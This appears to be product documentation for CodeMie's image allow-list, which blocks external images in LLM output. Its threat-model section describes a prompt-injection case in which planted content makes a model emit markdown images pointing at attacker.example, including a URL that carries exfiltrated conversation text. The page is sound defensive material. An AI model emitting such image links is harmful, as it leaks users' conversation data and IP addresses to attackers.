---
id: llm-output-image-allow-list
title: Image Allow-List for LLM Output
sidebar_label: LLM Output Image Allow-List
sidebar_position: 3
pagination_prev: admin/security/index
pagination_next: null
---

# Image Allow-List for LLM Output

Markdown returned by an LLM or assistant can contain image references. Without a restriction in place, the browser fetches every referenced URL, which turns any assistant answer into an outbound network channel. CodeMie gates every image rendered from LLM output against a per-deployment domain allow-list.

The allow-list ships empty, which denies all external images until a deployment populates it explicitly.

:::warning Default-deny on upgrade
After upgrading to a release that includes this control, **all** external images in assistant output stop rendering until `allowedImageDomains` is configured. Images served from the platform's own origin or from the backend API — including uploaded attachments — are unaffected and need no configuration. See [Rollout](#rollout).
:::

## Threat Model

An LLM reproduces content from the context supplied to it. That context can include material controlled by a third party: an indexed document, a page retrieved by a tool, a ticket description, or a message in a shared conversation. An instruction planted in such material can make the model emit an image reference pointing at an attacker-operated host.

Rendering `![](https://attacker.example/pixel.png)` causes the browser to request that URL the moment the message is displayed. No click is required. A single request of this kind discloses:

- That the message was opened, and when
- The viewer's IP address
- The referrer, which can carry conversation or workspace identifiers

Because the URL path and query string are attacker-chosen, data lifted from the surrounding conversation can be appended to them — for example `https://attacker.example/?d=<exfiltrated-text>` — turning passive tracking into active exfiltration.

The allow-list closes this channel by deciding, before any element is created, whether a host may be contacted at all.

## Scope of the Gate

The gate is applied during sanitization of the HTML produced from LLM output, so markdown image syntax and raw HTML tags are treated identically. It covers every render path that displays model output:

| Render path              | Where it appears                          |
| ------------------------ | ----------------------------------------- |
| Chat message renderer    | Assistant replies in conversations        |
| Shared markdown renderer | Markdown surfaces across the application  |
| Agent thought segments   | Intermediate reasoning shown during a run |
| Markdown editor preview  | Preview pane of the markdown editor       |

Four attributes can make a browser fetch an image, and all four are inspected: `src`, `srcset`, `poster`, and `background`. For `srcset`, each candidate URL in the list is checked separately.

How a blocked element is handled depends on its tag:

| Element           | Handling                                                                 |
| ----------------- | ------------------------------------------------------------------------ |
| `<img>`           | Replaced with a visible badge; no `<img>` element is created             |
| `<source>`        | Removed, so the `<img>` fallback inside the same picture element applies |
| Any other element | Only the offending attribute is removed; the element itself is kept      |

:::note User-authored content is not affected
The gate runs on a dedicated sanitizer instance reserved for model output. Content authored by people — chat editor input, notifications, and rendered Mermaid diagrams — continues to use the default sanitizer and is not subject to the allow-list.
:::

## Decision Order

Every candidate image URL is evaluated against the following conditions in order. The first condition that matches determines the outcome.

| Order | Condition                                                                    | Outcome                                       |
| ----- | ---------------------------------------------------------------------------- | --------------------------------------------- |
| 1     | Source is empty or contains only whitespace                                  | **Blocked**                                   |
| 2     | Source is a `data:image/*` URI                                               | **Allowed** — inline data, no network request |
| 3     | Source cannot be parsed as a URL                                             | **Blocked**                                   |
| 4     | Scheme is neither `http:` nor `https:`                                       | **Blocked**                                   |
| 5     | Scheme is `http:` and the page is not served from `localhost` or `127.0.0.1` | **Blocked**                                   |
| 6     | Origin matches the origin of the page itself                                 | **Allowed**                                   |
| 7     | Origin matches the backend API origin                                        | **Allowed**                                   |
| 8     | Allow-list is empty                                                          | **Blocked** — default-deny                    |
| 9     | Hostname matches an allow-list entry                                         | **Allowed**, otherwise **blocked**            |

Orders 6 and 7 are the reason uploaded attachments keep working without configuration: files served by the platform resolve either to the page origin or to the backend API origin.

## Entry Format

The configured value is a single comma-separated string of hostnames. Entries are trimmed and lowercased before matching.

| Entry style    | Example                     | Matches                                                               |
| -------------- | --------------------------- | --------------------------------------------------------------------- |
| Plain hostname | `raw.githubusercontent.com` | That exact host only                                                  |
| Leading dot    | `.example.com`              | The apex `example.com` and every subdomain, such as `cdn.example.com` |

Rules that apply to every entry:

- **Hostname only.** Port, path, and scheme are ignored during matching.
- **Minimum of two labels.** An entry that has fewer than two labels after the leading dot is removed is discarded. This makes overly broad values such as `com` or `.com` ineffective rather than catastrophic.
- **No implicit subdomains.** A plain entry never matches subdomains. To cover subdomains, the leading-dot form is required.
- **No substring matching.** `.example.com` does not match `evil-example.com`.

:::tip Keep the list minimal
Every entry is a host permitted to receive a request triggered by model output. Listing a host that serves user-uploadable content re-opens the channel the control closes. Prefer specific hostnames over leading-dot wildcards, and add a wildcard only when a content delivery network genuinely requires it.
:::

## Configuration

The allow-list is a customer configuration item named `allowedImageDomains`, delivered through the `codemie-customer-config` ConfigMap like any other per-deployment setting:

```yaml
components:
  - id: "allowedImageDomains"
    settings:
      enabled: true
      value: "raw.githubusercontent.com,.example.com,cdn.customer.io"
```

For the full parameter reference, the component overview table, and the complete `customer-config.yaml` example, see [Customer Feature Configuration](../configuration/codemie/customer-feature-configuration.md).

Matching is performed entirely in the browser. The backend stores the string and returns it verbatim through `GET /v1/config`; no filtering decision is made server-side.

## What Users See

When an image is blocked, an inline badge takes its place so that the omission is visible rather than silent:

- **Label** — `Image from cdn.unlisted.example blocked`, or `Image from untrusted domain blocked` when no hostname can be determined
- **Tooltip** — `Image not displayed: domain is not on the allow-list`

The badge is rendered as text with an icon. No `<img>` element exists at any point, so the browser issues no request for the blocked host.

## Rollout

1. **Inventory the hosts in use.** Identify the domains that legitimately serve images in assistant output for the deployment — documentation content delivery networks, internal asset hosts, and repository raw-content hosts are the usual cases.
2. **Populate `allowedImageDomains`** in `customer-config.yaml` before or together with the upgrade, so that external images do not disappear for users in the interval between the two.
3. **Apply the configuration change.** Follow the [Update Guide](../update/codemie-platform/update-core-components.md) to roll out the modified ConfigMap.
4. **Have users reload the application.** The customer configuration is fetched once per browser tab, so a tab that was already open continues to use the previously fetched list until it is reloaded.
5. **Verify** as described below.

Attachments uploaded through the platform, same-origin assets, and inline `data:image/*` content require no entries and are unaffected at every step.

## Verification

To confirm the control is active in a deployment:

1. Open an assistant answer containing an image hosted on a listed domain, and confirm it renders.
2. Open an answer containing an image hosted on a domain that is not listed, and confirm the badge appears in place of the image.
3. With the browser developer tools open on the Network tab, reload the second message and confirm that no request is issued to the blocked host.

If a legitimate image is blocked, compare its hostname against the configured entries, keeping in mind that a plain entry does not cover subdomains and that entries with fewer than two labels are discarded.
